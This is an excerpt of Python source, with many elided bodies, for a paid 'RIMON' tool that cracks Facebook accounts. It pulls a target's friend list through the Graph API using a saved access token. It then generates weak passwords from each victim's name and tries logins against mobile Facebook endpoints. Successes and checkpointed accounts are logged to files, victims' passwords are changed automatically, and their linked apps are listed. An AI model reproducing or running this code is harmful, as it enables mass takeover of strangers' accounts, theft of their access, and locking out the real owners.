                _cokzz_ = _cici_rimon_('%s [%s!%s] %sID HAS BEEN CRACKED, CONTINUE? [Y/n] : '%(M,P,M,P))
                if _cokzz_ in ['',' ']:pass
                elif _cokzz_ in ['1','01','y']:pass
                elif _cokzz_ in ['2','0','n']:menu()
                else:pass
        else:_rimon_dapunta_('list_id.txt',"a+").write("%s\n"%(_id_))
    except:pass
...
def generate1(_cici_):
    ...
    for i in _cici_.split(" "):
        if len(i)<3:continue 
            ...
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_rimon_.append(i+"123");_rimon_.append(i+"12345")
            elif len(i)>=6:_rimon_.append(i);_rimon_.append(i+"123");_rimon_.append(i+"12345")
            else:continue
    _rimon_.append(_cici_.lower())
    return _rimon_
...
def generate2(_cici_):
    ...
    for i in _cici_.split(" "):
        if len(i)<3:continue
            ...
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_rimon_.append(i+"123");_rimon_.append(i+"1234");_rimon_.append(i+"12345")
            else:_rimon_.append(i);_rimon_.append(i+"12");_rimon_.append(i+"123");_rimon_.append(i+"1234");_rimon_.append(i+"12345")
    _rimon_.append(_cici_.lower());_rimon_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1])
    return _rimon_
...
def generate3(_cici_):
    ...
    for i in _cici_.split(" "):
        if len(i)<3:continue
            ...
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_rimon_.append(i+"123");_rimon_.append(i+"1234");_rimon_.append(i+"12345");_rimon_.append(i+"@123")
            else:_rimon_.append(i);_rimon_.append(i+"1");_rimon_.append(i+"12");_rimon_.append(i+"123");_rimon_.append(i+"1234");_rimon_.append(i+"12345");_rimon_.append(i.upper()+"123");_rimon_.append(i+"@#");_rimon_.append(i+"123@#")
    _rimon_.append(_cici_.lower());_rimon_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]);_rimon_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12");_rimon_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"123");_rimon_.append("iloveyou")
    return _rimon_


def generate4(_cici_):
    _rimon_=[]
    ps = _rimon_dapunta_('pass.txt','r').read()
    pp = _rimon_dapunta_('digitpass.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:_rimon_.append(i+"123");_rimon_.append(i+"12345")
        else:_rimon_.append(i);_rimon_.append(i+"123");_rimon_.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):_rimon_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):_rimon_.append(z)
    _rimon_.append(_cici_.lower())
    return _rimon_
def tambah_pass():
    print('%s '%(O));print('%s [%s•%s] %sEXAMPLE : %sAmerica,123456,102030,786786'%(H,P,H,K,H));cuy = _cici_rimon_('%s [%s•%s] %sENTER MANUAL SUPPLEMENTAL PASS [1 WORD] : '%(H,P,H,K));gh = _rimon_dapunta_('pass.txt','w');gh.write(cuy);gh.close
def tambah_pass_angka():
    print('%s [%s•%s] %sEXAMPLE : %s143,786,gaming'%(H,P,H,K,H));coy = _cici_rimon_('%s [%s•%s] %sENTER ADDITIONAL PASS BEHIND NAME : '%(H,P,H,K));xy = _rimon_dapunta_('digitpass.txt','w');xy.write(coy);xy.close
    
### Logger Crack
def log_api_1(em,pas):
    ua = _rimon_dapunta_('ugent.txt','r').read()
    r = requests.Session()
...
def cek_opsi(user,pw,format):
    ...
    if "c_user" in _req_ses_.cookies.get_dict():
        ...
        for _rimon_ in _response_("input"):
            if _rimon_.get("name") in list_input:data_2.update({_rimon_.get("name"):_rimon_.get("value")})
...
def auto_ganti_pass(_piye_):
    while True:
        _gimana_ = _cici_rimon_('%s [%s•%s] %sCHANGE ONE TAP ACCOUNT PASS? [Y/n] : '%(H,P,H,K))
        if _gimana_ in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        elif _gimana_ in ['1','01','001','y','Y']:
            open('auto_ganti.txt','w').write('Yes');_newpass_ = _cici_rimon_('%s [%s•%s] %sENTER ONE TAP PASSWORD : '%(H,P,H,K))
...
def change_pass(user,_req_ses_,_response_,link_2):
    ...
    for _rimon_ in _response_("input"):
        if _rimon_.get("name") in _button_dev_:data_change_1.update({_rimon_.get("name"):_rimon_.get("value")})
    ...
    if "Create a new password" in re.findall("\<title>(.*?)<\/title>",str(_ganti_pass_)):
        ...
        data_change_2.update({"password_new":_password_});_ses_final_ = _req_ses_.post(host+_link_3_.get("action"),data=data_change_2);_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in _req_ses_.cookies.get_dict().items()]);__cookies__ = cvt_cookies(_cookies_);cek_apk(_result_ok_,__cookies__);ok.append("%s•%s"%(user,_password_));_rimon_dapunta_(files_ok,"a+").write("%s•%s\n"%(user,_password_));cp -= 1;pass
    else:pass

### Check Application
def cek_apk(h_ok,_rimon_):
    apk = [];ses_ = requests.Session()
    cek_pilih_opsi = open('muncul_opsi.txt','r').read()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active";dat_game = ses_.get(url,cookies={'cookie':_rimon_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:celeng = asu.find('span').text;apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive";dat_game = ses_.get(url2,cookies={'cookie':_rimon_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:celeng = asu.find('span').text;apk.append('\n   • '+celeng)
        except:pass
...
def pilih_methode():
    ...
    while True:
        start_method()
        put = _cici_rimon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
...
class crack:
    def __init__(self,files):
        ...
        while True:
            ...
            _pilih_sandi_ = _cici_rimon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
            if _pilih_sandi_=="":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
            elif _pilih_sandi_ in ['m','M','2','02','002']:
                try:
                    while True:
                        try:self.apk = files;self.fs = _rimon_dapunta_(self.apk).read().splitlines();break
                ...
                try:
                    ...
                    self.fl = [];start_methodezz();kopi = _cici_rimon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
                    if kopi in ['']:
                    ...
                    print('%s '%(O));puf = _cici_rimon_('%s [%s•%s] %sBRING UP CP OPTIONS? [Y/n] : '%(H,P,H,K))
    ...
    def pwlist(self):
        self.pw = _cici_rimon_('%s [%s•%s] %sENTER PASSWORD : '%(K,P,K,H)).split(",")
        if len(self.pw) ==0:self.pwlist()
        else:
            for i in self.fl:i.update({"pw":self.pw})
            try:os.remove('cp_option.txt')
            except:pass
            print('%s '%(O));puf = _cici_rimon_('%s [%s•%s] %sPOP UP CP OPTIONS? [Y/n] : '%(H,P,H,K))
            if puf in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    files_cp = "RIMON-CP/%s.txt"%(tanggal)
                    if fl.get("id") in files_cp:pass
                    else:
                        try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _rimon_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
                        except:ttll = (''%())
                        h_cp = "\r %s[%sRIMON-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                        self.cp.append("%s•%s"%(fl.get("id"),i));_rimon_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
                elif log.get("status")=="ok":
                    files_ok = "RIMON-OK/%s.txt"%(tanggal)
                    if fl.get("id") in files_ok:pass
                    else:
                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sRIMON-OK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
                        else:print("\r %s[%sRIMON-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                        self.ada.append("%s•%s"%(fl.get("id"),i));_rimon_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
...
def teman_target():
    it = _cici_rimon_('%s [%s•%s] %sTARGET ID :%s '%(H,P,H,K,H))
    try:token = _rimon_dapunta_('token.txt','r').read();mm = _req_get_('https://graph.facebook.com/%s?access_token=%s'%(it,token));nn = _js_lo_(mm.text);print ('%s [%s•%s] %sNAME : %s'%(H,P,H,K,nn['name']))
    except (KeyError,IOError):jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));menu_log()
    tt=[];te=[];lim = _cici_rimon_('%s [%s•%s] %sDUMP LIMIT : %s'%(H,P,H,K,H));print('%s %s'%(O,P));ada = _req_get_('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token));idi = _js_lo_(ada.text)
    ...
    print(' ');_cici_rimon_(' [ BACK ]');menu()

### Menu Checking Crack result
def result():
    clear()
    banner()
    jalan('%s [ %sCRACK RESULTS %s]'%(H,P,H));print('%s '%(O));print('%s [%s1%s] %sCHECK RESULTS OK'%(H,P,H,K));print('%s [%s2%s] %sCHECK RESULTS CP'%(H,P,H,P));ch = _cici_rimon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("RIMON-OK");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN OK FILE %s]'%(H,P,H));print('%s '%(O))
            for file in okl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_rimon_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _rimon_dapunta_("RIMON-OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sRIMON-OK%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("RIMON-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_rimon_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _rimon_dapunta_("RIMON-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sRIMON-CP%s] %s'%(K,P,K,yyy))
    ...
    print('%s '%(O));_cici_rimon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()

def cek_result():
    try:os.remove('option_.txt')
    except:pass
    cik = open('option_.txt','w');cik.write('result');cik.close()
    print('%s [ %sCHECK CRACK RESULT ACCOUNT OPTIONS %s]'%(H,K,H));print('%s '%(O));print('%s [%s•%s] %sEXAMPLE FILE : %s.txt'%(H,P,H,K,tanggal));files__ = _cici_rimon_('%s [%s•%s] %sFile : '%(H,P,H,K));files = "CP/"+files__
    try:buka_baju = _rimon_dapunta_(files,"r").read().splitlines()
    ...
    for memek in buka_baju:
        ...
        _format_ = "\r %s[%sRIMON-CP%s] %s          "%(K,P,K,kontol)
        try:cek_opsi(titid[0],titid[1],_format_)
        except:continue
    print("");print('%s [%s•%s] %sCHECKING PROCESS COMPLETE'%(H,P,H,K));print('%s '%(O));_cici_rimon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
...
def started():
    ...
    print('%s [%s•%s] %s[%sOK%s] IDS SAVED IN >> %sRIMON-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sCP%s] IDS SAVED IN >> %sRIMON-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
    psb('%s [%s•%s] %sON FLIGHT MODE FOR [5 SEC] EVERY 5 MINUTES\n'%(H,P,H,B))


def folder():
    try:os.mkdir("RIMON-CP")
    except:pass
    try:os.mkdir("RIMON-OK")
    except:pass
...
def genkey():
	try:
		...
		subprocess.check_output(["am", "start", "https://wa.me/+8801621294418"])
		exit()
	except(IOError):
		rb = rx
		...
		banner()
		psb('       %s》%s》%s》%sPOWER OF RIMON%s《%s《%s《'%(M,H,B,H,B,H,M))
		print("\n\033[0;91m              YOU ARE NOT PREMIUM USER ")
		print("\033[0;91m           FIRST BUY PREMIUM KEY FROM OWNER")
		print("\033[0;91m.          PAYMENT CANT BE UNDONE")
		print("\033[0;91m.          CHANGE USER AGENT IF CP IDS CAME")
